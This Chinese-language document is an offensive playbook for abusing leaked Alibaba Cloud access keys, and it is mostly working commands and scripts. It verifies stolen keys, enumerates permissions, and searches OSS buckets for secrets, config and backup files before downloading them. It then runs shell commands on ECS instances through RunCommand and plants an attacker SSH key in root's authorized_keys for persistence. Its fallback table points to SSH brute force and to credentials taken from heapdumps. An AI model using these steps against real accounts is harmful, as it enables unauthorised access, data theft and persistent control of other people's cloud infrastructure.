## 1. 验证 AK 身份（GetCallerIdentity）

```bash
# 设置临时凭据（替换实际值）
export ALICLOUD_ACCESS_KEY="LTAI5t..."
export ALICLOUD_SECRET_KEY="xxxxxx"
export ALICLOUD_REGION="cn-hangzhou"   # 按目标推断，常见：cn-hangzhou / ap-southeast-1

# 方法 A：aliyun CLI
pip install aliyun-python-sdk-core aliyun-python-sdk-sts 2>/dev/null
aliyun sts GetCallerIdentity \
  --access-key-id "$ALICLOUD_ACCESS_KEY" \
  --access-key-secret "$ALICLOUD_SECRET_KEY" \
  --region "$ALICLOUD_REGION"

# 方法 B：直接签名请求（无 CLI 时）
python3 - <<'EOF'
import hmac, hashlib, base64, urllib.request, urllib.parse, time, uuid, os, json

ak = os.environ["ALICLOUD_ACCESS_KEY"]
sk = os.environ["ALICLOUD_SECRET_KEY"]

def sign(params, sk):
    keys = sorted(params)
    qs = "&".join(f"{urllib.parse.quote(k,'~')}={urllib.parse.quote(str(params[k]),'~')}" for k in keys)
    to_sign = f"GET&{urllib.parse.quote('/','~')}&{urllib.parse.quote(qs,'~')}"
    h = hmac.new((sk+"&").encode(), to_sign.encode(), hashlib.sha1)
    return base64.b64encode(h.digest()).decode()

params = {
    "Action":"GetCallerIdentity","Format":"JSON","Version":"2015-04-01",
    "AccessKeyId":ak,"SignatureMethod":"HMAC-SHA1","Timestamp":time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime()),
    "SignatureVersion":"1.0","SignatureNonce":uuid.uuid4().hex,
}
params["Signature"] = sign(params, sk)
url = "https://sts.aliyuncs.com/?" + urllib.parse.urlencode(params)
r = urllib.request.urlopen(url, timeout=10)
print(json.dumps(json.loads(r.read()), indent=2, ensure_ascii=False))
EOF
```

**关注字段**：`AccountId`（主账号）、`UserId`（子账号 UID）、`Arn`（权限角色）、`IdentityType`（RAM / STS）

## 2. 权限快速枚举

### 2.1 OSS（通常最先有）

```bash
# 列桶
aliyun oss ls --access-key-id "$ALICLOUD_ACCESS_KEY" \
              --access-key-secret "$ALICLOUD_SECRET_KEY"

# 列桶内文件（找配置/备份）
aliyun oss ls oss://<桶名>/ --access-key-id "$ALICLOUD_ACCESS_KEY" \
                             --access-key-secret "$ALICLOUD_SECRET_KEY" \
                             --recursive | grep -E "\.env|config|sql|backup|key|secret"

# 下载敏感文件
aliyun oss cp oss://<桶名>/<路径> /tmp/out \
  --access-key-id "$ALICLOUD_ACCESS_KEY" --access-key-secret "$ALICLOUD_SECRET_KEY"
```

### 2.2 RAM 权限枚举

```bash
# 列 RAM 策略（看有哪些权限）
aliyun ram ListPoliciesForUser --UserName <用户名> \
  --access-key-id "$ALICLOUD_ACCESS_KEY" --access-key-secret "$ALICLOUD_SECRET_KEY"

# 列所有可用 Action（暴力枚举权限边界）
python3 - <<'EOF'
# 常见高价值 Action 快速试
import subprocess, json

actions = [
    ("ecs", "DescribeInstances", {"RegionId":"cn-hangzhou"}),
    ("ecs", "DescribeInstances", {"RegionId":"ap-southeast-1"}),
    ("rds", "DescribeDBInstances", {"RegionId":"cn-hangzhou"}),
    ("ecs", "DescribeSecurityGroups", {"RegionId":"cn-hangzhou"}),
    ("ram", "ListUsers", {}),
    ("ram", "ListAccessKeys", {"UserName":""}),
]
import os
ak = os.environ["ALICLOUD_ACCESS_KEY"]
sk = os.environ["ALICLOUD_SECRET_KEY"]

for svc, action, extra in actions:
    cmd = ["aliyun", svc, action,
           "--access-key-id", ak, "--access-key-secret", sk]
    for k, v in extra.items():
        cmd += [f"--{k}", v]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    ok = "Error" not in r.stdout and r.returncode == 0
    print(f"{'✅' if ok else '❌'} {svc}.{action}: {r.stdout[:120].strip() or r.stderr[:80].strip()}")
EOF
```

### 2.3 ECS 实例清单

```bash
# 列 ECS（常见区域都试）
for region in cn-hangzhou cn-shanghai cn-beijing ap-southeast-1 ap-southeast-3; do
  echo "=== $region ==="
  aliyun ecs DescribeInstances --RegionId "$region" \
    --access-key-id "$ALICLOUD_ACCESS_KEY" --access-key-secret "$ALICLOUD_SECRET_KEY" \
    --output cols=InstanceId,InstanceName,PublicIpAddress,PrivateIpAddress rows=Instances.Instance[]
done
```

## 3. RunCommand 拿 Shell（ECS 云助手）

> 前提：AK 有 `ecs:RunCommand` 权限，且实例已安装云助手（默认阿里云实例都装）。

```bash
# 3.1 查云助手状态
aliyun ecs DescribeCloudAssistantStatus \
  --RegionId "$ALICLOUD_REGION" \
  --InstanceIds '["i-xxxxxxxxx"]' \
  --access-key-id "$ALICLOUD_ACCESS_KEY" --access-key-secret "$ALICLOUD_SECRET_KEY"

# 3.2 发送命令（whoami 验证）
aliyun ecs RunCommand \
  --RegionId "$ALICLOUD_REGION" \
  --Type RunShellScript \
  --CommandContent "$(echo 'id; whoami; hostname; cat /etc/passwd | head -5' | base64)" \
  --InstanceIds '["i-xxxxxxxxx"]' \
  --access-key-id "$ALICLOUD_ACCESS_KEY" --access-key-secret "$ALICLOUD_SECRET_KEY"

# 3.3 查结果（取 InvocationId 再查）
aliyun ecs DescribeInvocationResults \
  --RegionId "$ALICLOUD_REGION" \
  --InvokeId "<上面返回的InvokeId>" \
  --access-key-id "$ALICLOUD_ACCESS_KEY" --access-key-secret "$ALICLOUD_SECRET_KEY"
```

### 3.4 上传 SSH 公钥（持久化）

```bash
# 本机生成密钥对
ssh-keygen -t ed25519 -f /tmp/lulu_ecs -N "" -q

PUB=$(cat /tmp/lulu_ecs.pub)
CMD="mkdir -p ~/.ssh && echo '$PUB' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
CMD_B64=$(echo "$CMD" | base64)

aliyun ecs RunCommand \
  --RegionId "$ALICLOUD_REGION" \
  --Type RunShellScript \
  --CommandContent "$CMD_B64" \
  --InstanceIds '["i-xxxxxxxxx"]' \
  --Username root \
  --access-key-id "$ALICLOUD_ACCESS_KEY" --access-key-secret "$ALICLOUD_SECRET_KEY"

# 等 10-30 秒后连接
ssh -i /tmp/lulu_ecs root@<实例公网IP>
```

## 5. STS 临时凭据横向

如果拿到的是 STS 短效 Token（heapdump 里常见）：

```bash
export ALICLOUD_ACCESS_KEY="STS.xxx"
export ALICLOUD_SECRET_KEY="xxxx"
export SECURITY_TOKEN="xxxx"   # STS 独有

# 验证有效期
aliyun sts GetCallerIdentity \
  --access-key-id "$ALICLOUD_ACCESS_KEY" \
  --access-key-secret "$ALICLOUD_SECRET_KEY" \
  --sts-token "$SECURITY_TOKEN" \
  --region "$ALICLOUD_REGION"
```

STS 通常 1 小时过期，优先检查 `Expiration` 字段。过期则退回 OSS 桶找持久 AK（常见于 `application.yml` / `.env`）。

## 7. 失败/降级路径

| 失败点 | 原因 | 降级 |
|--------|------|------|
| GetCallerIdentity 403 | AK 过期或被删 | 退回找其它 AK（OSS 桶 / JS 硬编码） |
| DescribeInstances 空 | 区域不对 | 枚举所有区域 |
| RunCommand 无权限 | RAM 只有 OSS 权限 | 满足于 OSS 数据，走 mysql-dump |
| 云助手未安装 | 老实例 | SSH 暴力破解 / 宝塔面板 / 换路 |
| STS 已过期 | 短效 token | 找同堆里的持久 AK |
